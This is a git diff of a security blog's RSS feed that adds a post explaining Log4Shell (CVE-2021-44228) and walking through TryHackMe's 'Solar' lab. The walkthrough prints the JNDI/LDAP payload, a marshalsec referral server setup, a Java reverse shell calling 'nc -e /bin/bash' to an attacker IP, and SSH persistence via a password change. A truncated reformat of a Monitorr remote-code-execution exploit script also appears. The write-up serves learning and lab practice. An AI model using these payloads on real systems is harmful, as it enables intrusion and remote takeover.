@@ -6,8 +6,350 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>en-us</language>
 		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-		<lastBuildDate>Wed, 30 Jun 2021 11:41:54 +0530</lastBuildDate>
+		<lastBuildDate>Sun, 19 Dec 2021 15:30:58 +0530</lastBuildDate>
 		<atom:link href="https://riteshpuvvada.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)</title>
+			<link>https://riteshpuvvada.github.io/posts/log4j/</link>
+			<pubDate>Sun, 19 Dec 2021 15:30:58 +0530</pubDate>
+			
+			<guid>https://riteshpuvvada.github.io/posts/log4j/</guid>
+			<description>Log4Shell (CVE-2021-44228) is a zero-day vulnerability in Apache Log4j 2, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.
+ What is LDAP Server &amp;amp; How Does it Works? The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories.</description>
+			<content type="html"><![CDATA[<p>Log4Shell <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">(CVE-2021-44228)</a> is a zero-day vulnerability in <a href="https://logging.apache.org/log4j/2.x/">Apache Log4j 2</a>, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.</p>
+<p><img src="/img/blog/LOG/Log4j.png" alt="img"></p>
+<hr>
+<h2 id="what-is-ldap-server--how-does-it-works">What is LDAP Server &amp; How Does it Works?</h2>
+<p>The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories.</p>
+<p>LDAP can address authentication as well.This enables clients to connect once and access many different files on the server.</p>
+<figure class="right"><img src="/img/blog/LOG/Ldap.png"
+         alt="image"/><figcaption>
+            <p>The LDAP Process Explained</p>
+        </figcaption>
+</figure>
+
+<p><strong>LDAP is vendor-neutral, so it can be utilized with a variety of different directory programs -</strong></p>
+<ul>
+<li>
+<p><strong>Descriptive -</strong> Multiple points, such as name and location, come together to define an asset.</p>
+</li>
+<li>
+<p><strong>Static -</strong> The information doesn’t change much and when it does, the shifts are subtle.</p>
+</li>
+<li>
+<p><strong>Valuable -</strong> Data stored within the directory is critical to core business functions and it&rsquo;s touched over and over again.</p>
+</li>
+</ul>
+<p>The average employee connects to LDAP handfuls or even many times a day.That individual may not have the foggiest idea about the connection that has happened even though the steps to complete a query are intricate and complex.</p>
+<p>An LDAP query typically involves:</p>
+<ol>
+<li>
+<p><strong>Session connection -</strong> The user connects to the server via an LDAP port (typically port TCP/389).</p>
+</li>
+<li>
+<p><strong>Request -</strong> The client submits a query, such as an email lookup to the server.</p>
+</li>
+<li>
+<p><strong>Response -</strong> The LDAP protocol searches the Directory for the relevant information and delivers it to the user.</p>
+</li>
+<li>
+<p><strong>Completion -</strong> After receiving the response, the user disconnects from the LDAP port.</p>
+</li>
+</ol>
+<hr>
+<h2 id="what-is-jndi-">What is JNDI ?</h2>
+<p>The Java Naming and Directory Interface (JNDI) is a Java API for a directory service that allows Java software clients to discover and look up data and resources (in the form of Java objects) via a name.</p>
+<figure class="left"><img src="/img/blog/LOG/Jndi.png"
+         alt="image"/><figcaption>
+            <p>JNDI Implementation Possibilities</p>
+        </figcaption>
+</figure>
+
+<p>Like all Java APIs that interface with host systems, JNDI is independent of the underlying implementation. Additionally, it specifies a service provider interface (SPI) that allows directory service implementations to be plugged into the framework. The information looked up via JNDI may be supplied by a server, a flat file, or a database; the choice is up to the implementation used.<a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">[Source]</a></p>
+<h3 id="architecture">Architecture</h3>
+<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services. The SPI enables a variety of naming and directory services to be plugged in transparently, thereby allowing the Java application using the JNDI API to access their services</p>
+<h3 id="packaging">Packaging</h3>
+<p>To use the JNDI, you must have the JNDI classes and one or more service providers. The JDK includes service providers for the following naming/directory services</p>
+<ul>
+<li>Lightweight Directory Access Protocol (LDAP)</li>
+<li>Common Object Request Broker Architecture (CORBA)</li>
+<li>Common Object Services (COS) name service</li>
+<li>Java Remote Method Invocation (RMI) Registry</li>
+<li>Domain Name Service (DNS)</li>
+</ul>
+<hr>
+<h1 id="solar-exploiting-log4j--a-walkthrough">Solar, exploiting log4j : A Walkthrough</h1>
+<p>The detailed write-up of the TryHackMe room <em><strong>Solar, exploiting log4j</strong></em></p>
+<p><a href="https://tryhackme.com/room/solar">Link to the room</a></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<ul>
+<li>Basic Nmap scan</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# nmap -sV -A -T5 10.10.129.133
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-20 13:48 IST
+Warning: 10.10.129.133 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
+Stats: 0:00:49 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+NSE Timing: About 99.64% <span class="k">done</span><span class="p">;</span> ETC: 13:49 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for</span> 10.10.129.133
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+Not shown: <span class="m">974</span> closed ports
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">2048</span> e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 <span class="o">(</span>ED25519<span class="o">)</span>
+111/tcp   open     rpcbind        2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+<span class="p">|</span> rpcinfo:
+<span class="p">|</span>   program version    port/proto  service
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  3,4          111/tcp6  rpcbind
+<span class="p">|</span>_  <span class="m">100000</span>  3,4          111/udp6  rpcbind
+593/tcp   filtered http-rpc-epmap
+765/tcp   filtered webster
+1063/tcp  filtered kyoceranetdev
+1114/tcp  filtered mini-sql
+1417/tcp  filtered timbuktu-srv1
+1443/tcp  filtered ies-lm
+2009/tcp  filtered news
+2068/tcp  filtered avocentkvm
+2710/tcp  filtered sso-service
+2869/tcp  filtered icslap
+3918/tcp  filtered pktcablemmcops
+5214/tcp  filtered unknown
+5280/tcp  filtered xmpp-bosh
+5414/tcp  filtered statusd
+6156/tcp  filtered unknown
+6646/tcp  filtered unknown
+7435/tcp  filtered unknown
+8983/tcp open  http    Apache Solr
+<span class="p">|</span> http-title: Solr Admin
+<span class="p">|</span>_Requested resource was http://10.10.129.133:8983/solr/
+9003/tcp  filtered unknown
+9102/tcp  filtered jetdirect
+16992/tcp filtered amt-soap-http
+27352/tcp filtered unknown
+30718/tcp filtered unknown
+50389/tcp filtered unknown
+52822/tcp filtered unknown
+Aggressive OS guesses: Linux 3.1 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>94%<span class="o">)</span>, AXIS 210A or <span class="m">211</span> Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>94%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.39 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.1 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>
+No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+Network Distance: <span class="m">4</span> hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 199/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+<span class="m">1</span>   273.69 ms 10.6.0.1
+<span class="m">2</span>   ... <span class="m">3</span>
+<span class="m">4</span>   289.39 ms 10.10.129.133
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 50.25 seconds
+
+</code></pre></div><p>From the above scan, we can see port 8938 running <a href="https://solr.apache.org/">Apache Solr</a></p>
+<pre><code>8983/tcp open  http    Apache Solr
+| http-title: Solr Admin
+|_Requested resource was http://10.10.129.133:8983/solr/
+</code></pre><h3 id="what-is-apache-solr">What is Apache Solr?</h3>
+<blockquote>
+<p>Solr is highly reliable, scalable and fault tolerant, providing distributed indexing, replication and load-balanced querying, automated failover and recovery, centralized configuration and more. Solr powers the search and navigation features of many of the world&rsquo;s largest internet sites</p>
+</blockquote>
+<hr>
+<h2 id="discovery">Discovery</h2>
+<ul>
+<li>Apache Solr 8.11.0 admin page</li>
+</ul>
+<p><img src="/img/blog/LOG/log1.png" alt="img"></p>
+<ol>
+<li>Question</li>
+</ol>
+<p>You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the <code>-Dsolr.log.dir</code> argument set to, displayed on the front page?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/var/solr/logs
+</code></pre></div><ol start="2">
+<li>Question</li>
+</ol>
+<p>One file has a significant number of <code>INFO</code> entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr.log
+</code></pre></div><p><em>Few log entries in <code>solr.log</code></em></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">2021-12-13 03:47:53.989 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:54.819 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:55.284 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:55.682 INFO  <span class="o">(</span>qtp1083962448-22<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.075 INFO  <span class="o">(</span>qtp1083962448-20<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.459 INFO  <span class="o">(</span>qtp1083962448-23<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.844 INFO  <span class="o">(</span>qtp1083962448-14<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.253 INFO  <span class="o">(</span>qtp1083962448-17<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.548 INFO  <span class="o">(</span>qtp1083962448-18<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.758 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:58.058 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">1</span>
+2021-12-13 03:47:58.346 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+</code></pre></div><ol start="3">
+<li>Question</li>
+</ol>
+<p>What &ldquo;path&rdquo; or URL endpoint is indicated in these repeated entries?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/admin/cores
+</code></pre></div><ol start="4">
+<li>Question</li>
+</ol>
+<p>Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">params
+</code></pre></div><hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><code>http://10.10.132.1:8983/solr/admin/cores?cmd=$\{payload}</code></p>
+<p>The log4j package adds extra logic to logs by &ldquo;parsing&rdquo; entries, ultimately to enrich the data &ndash; but may additionally take actions and even evaluate code based on the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.</p>
+<p>Some examples of this syntax are:</p>
+<ul>
+<li><code>${sys:os.name}</code></li>
+<li><code>${sys:user.name}</code></li>
+<li><code>${log4j:configParentLocation}</code></li>
+<li><code>${ENV:PATH}</code></li>
+<li><code>${ENV:HOSTNAME}</code></li>
+<li><code>${java:version}</code></li>
+</ul>
+<p>General format of the payload to abuse log4j vulnerability.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://ATTACKERCONTROLLEDHOST</span><span class="si">}</span>
+</code></pre></div><p><img src="/img/blog/LOG/log2.png" alt="img"></p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<p><strong>We can now build upon this foundation to respond with a real LDAP handler.</strong></p>
+<p>We will utilize a open-source and public utility to stage an &ldquo;LDAP Referral Server&rdquo;. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run the code on the target.</p>
+<ol>
+<li>
+<p><code>${jndi:ldap://attackerserver:1389/Resource}</code> -&gt; reaches out to our LDAP Referral Server</p>
+</li>
+<li>
+<p>LDAP Referral Server springboards the request to a secondary address (<em>This is a web server that we will configure to host the malicious java exploition.</em>) <code>http://attackerserver/resource</code></p>
+</li>
+<li>
+<p>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code></p>
+</li>
+</ol>
+<p>We will use the <code>marshalsec</code> utility offered at <a href="https://github.com/mbechler/marshalsec">Github</a></p>
+<ul>
+<li>If you do not yet have git, you can install it through your package manager</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install git
+</code></pre></div><ul>
+<li>Clone the repository</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/mbechler/marshalsec
+
+<span class="nb">cd</span> marshalsec
+</code></pre></div><ul>
+<li>If you do not yet have maven on your system, you can install it through your package manager</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install maven
+</code></pre></div><ul>
+<li>Command to build the marshalsec tool with maven</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mvn clean package -DskipTests
+</code></pre></div><p><img src="/img/blog/LOG/log3.png" alt="img"></p>
+<p>With this utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="s2">&#34;http://YOUR.IP.ADDRESS:8080/#Exploit&#34;</span>
+</code></pre></div><p><img src="/img/blog/LOG/log4_1.png" alt="img"></p>
+<ol>
+<li>Question</li>
+</ol>
+<p>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Listening on 0.0.0.0:1389
+</code></pre></div><p>Set up a payload <code>Exploit.java</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;nc -e /bin/bash YOUR.IP.ADDRESS 9999&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Compile your payload with <code>javac Exploit.java -source 8 -target 8</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# javac Exploit.java -source <span class="m">8</span> -target <span class="m">8</span>
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
+
+┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# ls
+Exploit.class  Exploit.java  marshalsec  solrlogs  solrlogs.zip
+</code></pre></div><p>Once your payload is created and compiled, you can host it by spinning up a temporary HTTP server.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# python -m SimpleHTTPServer <span class="m">8080</span>
+Serving HTTP on 0.0.0.0 port <span class="m">8080</span> ...
+</code></pre></div><p><strong>Note that HTTP server port number (8080 in this case) is referring to our LDAP referral server argument (8080).</strong></p>
+<p>At this point, our payload is created and complied, it is hosted by an HTTP server, our LDAP server is up and waiting. Now we need a Netcat listener to catch our reverse shell.</p>
+<p><img src="/img/blog/LOG/log5.png" alt="img"></p>
+<p>Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax !</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s1">&#39;http://10.10.61.83:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.IP.ADDRESS:1389/Exploit\}&#39;</span>
+</code></pre></div><p><strong>Note that changes in port number (now referring to our LDAP server).</strong></p>
+<blockquote>
+<p>After executing the above command</p>
+</blockquote>
+<p><img src="/img/blog/LOG/log6.png" alt="img"></p>
+<blockquote>
+<p>You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance.</p>
+</blockquote>
+<p><img src="/img/blog/LOG/log7.png" alt="img"></p>
+<p>We need to stabilize the shell</p>
+<ul>
+<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
+<li><code>stty raw -echo</code></li>
+<li><code>export TERM=xterm</code></li>
+</ul>
+<hr>
+<h2 id="persistence">Persistence</h2>
+<p>Now we have gained a reverse shell connection on the victim machine.</p>
+<ol>
+<li>Question</li>
+</ol>
+<p>Check to see what user account you are running as within the context of your reverse shell.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ whoami
+solr
+</code></pre></div><p>If you would like to grant yourself persistence and access into the machine via SSH, then momentarily become the root and change the password for the solr user to one of your choice. This way, you can SSH as per needed!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ sudo -l
+Matching Defaults entries <span class="k">for</span> solr on solar:
+    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>sudo, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User solr may run the following commands on solar:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+solr@solar:/opt/solr/server$ sudo bash
+root@solar:/opt/solr-8.11.0/server# passwd solr
+Enter new UNIX password: ritesh
+
+Retype new UNIX password: ritesh
+
+passwd: password updated successfully
+root@solar:/opt/solr-8.11.0/server#
+</code></pre></div><p>And we successfully logged in via <code>SSH</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─# ssh solr@10.10.61.83
+solr@10.10.61.83<span class="err">&#39;</span>s password:
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Dec <span class="m">23</span> 11:57:59 UTC <span class="m">2021</span>
+
+  System load:  0.01              Processes:           <span class="m">107</span>
+  Usage of /:   4.1% of 61.80GB   Users logged in:     <span class="m">0</span>
+  Memory usage: 83%               IP address <span class="k">for</span> eth0: 10.10.61.83
+  Swap usage:   0%
+
+
+<span class="m">246</span> packages can be updated.
+<span class="m">189</span> updates are security updates.
+
+
+Last login: Thu Dec <span class="m">23</span> 11:55:07 <span class="m">2021</span> from 10.6.29.240
+solr@solar:~$
+</code></pre></div><p><strong>Finally, an attacker can realistically do anything on the victim&rsquo;s machine - whether it can be privilege escalation, exfiltration, install persistence, perform a lateral movement, or any other post-exploitation even potentially dropping cryptocurrency miners, remote access trojans, beacons, and implants or even deploying ransomware.</strong></p>
+<p><em>This is the exact reason why the internet was on fire during the weekend of December 9th, 2021.</em></p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Server-Side Template Injection</title>
@@ -281,36 +623,36 @@ ff02::2 ip6-allrouters
 <p>If you find any login page for the target website, go ahead and download the <strong>Authorization Bypass</strong>.</p>
 <p>Otherwise download the <strong>Remote Code Execution (Unauthenticated)</strong>.</p>
 <p>Here is the code</p>
-<pre><code>#!/usr/bin/python
-# -*- coding: UTF-8 -*-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
 
-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
-# Date: September 12, 2020
-# Exploit Author: Lyhin's Lab
-# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
-# Software Link: https://github.com/Monitorr/Monitorr
-# Version: 1.7.6m
-# Tested on: Ubuntu 19
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
+<span class="c1"># Date: September 12, 2020</span>
+<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
+<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
+<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
+<span class="c1"># Version: 1.7.6m</span>
+<span class="c1"># Tested on: Ubuntu 19</span>
 
-import requests
-import os
-import sys
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
